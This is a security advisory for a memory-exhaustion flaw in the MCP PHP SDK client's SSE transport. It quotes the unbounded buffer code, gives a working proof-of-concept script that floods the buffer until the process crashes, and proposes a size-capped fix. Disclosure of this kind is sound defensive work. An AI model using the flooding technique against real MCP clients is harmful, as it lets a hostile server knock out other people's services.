# [H] MCP PHP SDK: client HttpTransport SSE buffer (sseBuffer .= chunk) grows unbounded when server withholds the event delimiter

## Summary
Severity: High
Advisory: GHSA-7m52-jw36-44r3
CVE: CVE-2026-53965
CWE: CWE-400, CWE-770
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-19
Source: https://github.com/advisories/GHSA-7m52-jw36-44r3
Type: github-advisory

## Affected
- Packagist: `mcp/sdk` — affected >=0.5.0 <0.7.1

## Details
## Summary

The HTTP client transport in `mcp/sdk` reads a Server-Sent-Events (SSE) response
stream incrementally and appends each 4 KiB chunk to an in-memory buffer
(`$this->sseBuffer .= $chunk;`) with **no upper bound**. The buffer is only ever
flushed when an SSE event delimiter (`"\n\n"`) appears. A remote MCP server (the
peer the client connects to) that streams response bytes without ever sending the
`"\n\n"` delimiter makes `$sseBuffer` grow without limit until the client process
exhausts its PHP `memory_limit` (fatal "Allowed memory size … exhausted") or is
killed by the OS OOM-killer.

This is a denial-of-service against the MCP **client**: any server it talks to —
or a network position that controls the server's response body — can crash the
client by withholding the event delimiter while streaming data.

## Impact

- **Type:** Denial of service (memory exhaustion / process crash) of the MCP client.
- **Who can trigger it:** The remote MCP server endpoint the client connects to via
  `HttpTransport`, or any party that can control/inject into that server's SSE
  response body (e.g. a man-in-the-middle on a plaintext endpoint, or a malicious
  or compromised server). The buffer growth happens while the transport is reading
  the response stream, before a complete event is ever parsed.
- **Effect:** A response stream of N bytes containing no `"\n\n"` drives the client's
  resident buffer to track N. A few hundred MB of delimiter-free data is enough to
  kill a client running with a typical `memory_limit`.
- **Severity (suggested, maintainer to confirm):** High — a remote server can
  reliably crash a connected client over the HTTP/SSE transport.

## How input reaches the sink (reachability)

1. A client connects to a server over the HTTP transport by constructing
   `Mcp\Client\Transport\HttpTransport` with the server endpoint URL, then runs
   the connect/request loop.
2. The transport's loop calls `tick()` (line 182), which calls
   `processSSEStream()` (line 194) on each iteration.
3. `processSSEStream()` reads up to 4096 bytes from the active SSE stream and
   appends them to `$this->sseBuffer` (line 203).
4. The buffer is only drained inside the `while (false !== ($pos = strpos($this->sseBuffer, "\n\n")))`
   loop (line 207). If the server never emits `"\n\n"`, the `strpos` never matches,
   the buffer is never flushed, and it grows on every `tick()` until OOM.

## Vulnerable code

`src/Client/Transport/HttpTransport.php` (v0.5.0):

```php
    private string $sseBuffer = '';
```

```php
    private function processSSEStream(): void
    {
        if (null === $this->activeStream) {
            return;
        }

        if (!$this->activeStream->eof()) {
            $chunk = $this->activeStream->read(4096);
            if ('' !== $chunk) {
                $this->sseBuffer .= $chunk;          // line 203 — unbounded append
            }
        }

        while (false !== ($pos = strpos($this->sseBuffer, "\n\n"))) {
            $event = substr($this->sseBuffer, 0, $pos);
            $this->sseBuffer = substr($this->sseBuffer, $pos + 2);

            if (!empty(trim($event))) {
                $this->processSSEEvent($event);
            }
        }

        if ($this->activeStream->eof() && empty($this->sseBuffer)) {
            $this->activeStream = null;
        }
    }
```

`$this->sseBuffer .= $chunk;` has no length guard; the drain loop only fires when a
`"\n\n"` delimiter is present.

## Proof of concept / End-to-end reproduction (against the released composer package)

Environment: macOS arm64, PHP 8.5.6 (cli), Composer 2.9.8. The package under test
is the real published release `mcp/sdk v0.5.0` (the version that introduced this
HTTP client transport), installed from Packagist — not a re-implementation of the
sink.

Install the released package:

```
$ composer require mcp/sdk:0.5.0 --no-interaction
  - Installing mcp/sdk (v0.5.0): Extracting archive
$ composer show mcp/sdk
name     : mcp/sdk
versions : * v0.5.0
```

PoC driver (`poc_sse.php`). It exercises the **unmodified** released
`processSSEStream()`; the `ProbeHttp` subclass uses reflection only to inject the
active SSE stream and to invoke the inherited private method — no transport logic
is overridden. `FloodStream` is a real PSR-7 `StreamInterface` that yields a large
body (4096 bytes per `read()`) that never contains `"\n\n"`, mirroring an
adversarial SSE server response. The null PSR-18/17 stubs only satisfy the
constructor; the sink reads exclusively from the injected stream and never touches
the HTTP client:

```php
<?php
require __DIR__ . '/vendor/autoload.php';
use Mcp\Client\Transport\HttpTransport;
use Psr\Http\Message\StreamInterface;
use Psr\Http\Client\ClientInterface;
use Psr\Http\Message\RequestFactoryInterface;
use Psr\Http\Message\StreamFactoryInterface;
use Psr\Http\Message\RequestInterface;
use Psr\Http\Message\ResponseInterface;

final class FloodStream implements StreamInterface {
    private int $served = 0;
    public function __construct(private int $total) {}
    public function read(int $length): string {
        if ($this->served >= $this->total) return '';
        $n = min($length, $this->total - $this->served);
        $this->served += $n;
        return str_repeat('A', $n);           // never contains "\n\n"
    }
    public function eof(): bool { return $this->served >= $this->total; }
    public function __toString(): string { return ''; }
    public function close(): void {}
    public function detach() { return null; }
    public function getSize(): ?int { return $this->total; }
    public function tell(): int { return $this->served; }
    public function isSeekable(): bool { return false; }
    public function seek(int $o, int $w = SEEK_SET): void {}
    public function rewind(): void {}
    public function isWritable(): bool { return false; }
    public function write(string $s): int { return 0; }
    public function isReadable(): bool { return true; }
    public function getContents(): string { return ''; }
    public function getMetadata(?string $key = null) { return null; }
}
final class NullHttpClient implements ClientInterface {
    public function sendRequest(RequestInterface $request): ResponseInterface { throw new \RuntimeException('not used'); }
}
final class NullRequestFactory implements RequestFactoryInterface {
    public function createRequest(string $method, $uri): RequestInterface { throw new \RuntimeException('not used'); }
}
final class NullStreamFactory implements StreamFactoryInterface {
    public function createStream(string $content = ''): StreamInterface { throw new \RuntimeException('not used'); }
    public function createStreamFromFile(string $filename, string $mode = 'r'): StreamInterface { throw new \RuntimeException('not used'); }
    public function createStreamFromResource($resource): StreamInterface { throw new \RuntimeException('not used'); }
}
final class ProbeHttp extends HttpTransport {
    public function inject(StreamInterface $s): void {
        (new ReflectionProperty(HttpTransport::class, 'activeStream'))->setValue($this, $s);
    }
    public function pump(): void {
        (new ReflectionMethod(HttpTransport::class, 'processSSEStream'))->invoke($this);
    }
}
function fmtMB(int $b): string { return number_format($b/1048576,1).' MB'; }
$mode = $argv[1] ?? 'attack';
$t = new ProbeHttp('http://127.0.0.1:9/mcp', [], new NullHttpClient(), new NullRequestFactory(), new NullStreamFactory());

if ($mode === 'control') {
    $body = '';
    for ($i=0;$i<1000;$i++) $body .= "event: message\ndata: {\"jsonrpc\":\"2.0\",\"id\":$i}\n\n";
    $tmp = fopen('php://temp','r+'); fwrite($tmp,$body); rewind($tmp);
    $t->inject(new FloodStream(0));   // replaced below by a real stream over $tmp
    $stream = new class($tmp) implements StreamInterface {
        public function __construct(private $h) {}
        public function read(int $l): string { return (string) fread($this->h, $l); }
        public function eof(): bool { return feof($this->h); }
        public function __toString(): string { return ''; }
        public function close(): void {}
        public function detach() { return null; }
        public function getSize(): ?int { return null; }
        public function tell(): int { return 0; }
        public function isSeekable(): bool { return false; }
        public function seek(int $o,int $w=SEEK_SET): void {}
        public function rewind(): void {}
        public function isWritable(): bool { return false; }
        public function write(string $s): int { return 0; }
        public function isReadable(): bool { return true; }
        public function getContents(): string { return ''; }
        public function getMetadata(?string $k=null) { return null; }
    };
    $t->inject($stream);
    $before = memory_get_usage(true);
    for ($i=0;$i<5000 && !$stream->eof();$i++) $t->pump();
    fwrite(STDERR,"[control] events fed   : 1000 well-formed SSE events (delimited by \\n\\n)\n");
    fwrite(STDERR,"[control] mem before   : ".fmtMB($before)."\n");
    fwrite(STDERR,"[control] mem after    : ".fmtMB(memory_get_usage(true))."\n");
    fwrite(STDERR,"[control] RESULT       : bounded, no OOM (each event flushed on \\n\\n)\n");
    exit(0);
}

ini_set('memory_limit','256M');
$SIZE = 400*1024*1024;                              // 400MB SSE body, NO "\n\n"
$t->inject(new FloodStream($SIZE));
fwrite(STDERR,"[attack] SSE body         : ".fmtMB($SIZE)." with NO \\n\\n delimiter\n");
fwrite(STDERR,"[attack] memory_limit     : ".ini_get('memory_limit')."\n");
fwrite(STDERR,"[attack] mem before       : ".fmtMB(memory_get_usage(true))."\n");
register_shutdown_function(function() {
    $err = error_get_last();
    fwrite(STDERR,"[attack] peak mem         : ".number_format(memory_get_peak_usage(true)/1048576,1)." MB\n");
    if ($err && stripos($err['message'],'memory')!==false)
        fwrite(STDERR,"[attack] RESULT           : OOM — ".trim($err['message'])."\n");
});
for ($i=0;;$i++) { $t->pump(); }      // each pump reads one 4096 chunk -> sseBuffer
```

Negative control — 1000 well-formed SSE events delimited by `"\n\n"`: each pump
flushes complete events, the buffer drains, memory stays flat:

```
$ php poc_sse.php control
[control] events fed   : 1000 well-formed SSE events (delimited by \n\n)
[control] mem before   : 2.0 MB
[control] mem after    : 2.0 MB
[control] RESULT       : bounded, no OOM (each event flushed on \n\n)
```

Attack — a 400 MB SSE body with no `"\n\n"`, client heap capped at 256 MB to make
the crash deterministic (a production client has a larger or unbounded limit and
is killed by the OS at whatever ceiling exists):

```
$ php poc_sse.php attack
[attack] SSE body         : 400.0 MB with NO \n\n delimiter
[attack] memory_limit     : 256M
[attack] mem before       : 2.0 MB
PHP Fatal error:  Allowed memory size of 268435456 bytes exhausted (tried to allocate 264241184 bytes) in /private/tmp/work/vendor/mcp/sdk/src/Client/Transport/HttpTransport.php on line 203
Stack trace:
#0 [internal function]: Mcp\Client\Transport\HttpTransport->processSSEStream()
#1 /private/tmp/work/poc_sse.php(69): ReflectionMethod->invoke(Object(ProbeHttp))
#2 /private/tmp/work/poc_sse.php(129): ProbeHttp->pump()
#3 {main}
[attack] peak mem         : 256.0 MB
[attack] RESULT           : OOM — Allowed memory size of 268435456 bytes exhausted (tried to allocate 264241184 bytes)
```

The fatal error lands on the released vendor file
`vendor/mcp/sdk/src/Client/Transport/HttpTransport.php` line 203, inside
`processSSEStream()`, while the delimiter-respecting control workload stays at
2.0 MB. This confirms the unbounded SSE accumulation on the real released package.

## Suggested fix

Bound the SSE buffer length and reject (or abort the stream) when it exceeds a
configured maximum, so a server cannot force unbounded growth before a complete
event arrives. For example:

```php
private const MAX_SSE_BUFFER_BYTES = 8 * 1024 * 1024; // 8 MiB, configurable

private function processSSEStream(): void
{
    if (null === $this->activeStream) {
        return;
    }

    if (!$this->activeStream->eof()) {
        $chunk = $this->activeStream->read(4096);
        if ('' !== $chunk) {
            if (\strlen($this->sseBuffer) + \strlen($chunk) > self::MAX_SSE_BUFFER_BYTES) {
                $this->sseBuffer = '';
                $this->activeStream = null;
                $this->logger->warning('Aborting SSE stream: buffer exceeded maximum size without a complete event.', [
                    'max_sse_buffer_bytes' => self::MAX_SSE_BUFFER_BYTES,
                ]);

                return;
            }
            $this->sseBuffer .= $chunk;
        }
    }

    while (false !== ($pos = strpos($this->sseBuffer, "\n\n"))) {
        $event = substr($this->sseBuffer, 0, $pos);
        $this->sseBuffer = substr($this->sseBuffer, $pos + 2);

        if (!empty(trim($event))) {
            $this->processSSEEvent($event);
        }
    }

    if ($this->activeStream->eof() && empty($this->sseBuffer)) {
        $this->activeStream = null;
    }
}
```

The cap value and the over-limit policy (abort vs. error) are the maintainers'
call. A fix PR against a private fork of the advisory workspace accompanies this
report.

## Fix PR

A patch bounding the SSE buffer is provided as a pull request against the private
temporary fork created for this advisory (the GHSA workspace fork). Details and
link are added to this advisory's thread once the private fork PR is opened. The
patch keeps the SSE event-parsing behaviour unchanged and only caps the buffer.

## Credit

Reported by tonghuaroot.

## References
- https://github.com/modelcontextprotocol/php-sdk/security/advisories/GHSA-7m52-jw36-44r3
- https://github.com/FriendsOfPHP/security-advisories/blob/master/mcp/sdk/CVE-2026-53965.yaml
- https://github.com/modelcontextprotocol/php-sdk
- https://github.com/modelcontextprotocol/php-sdk/releases/tag/v0.7.1
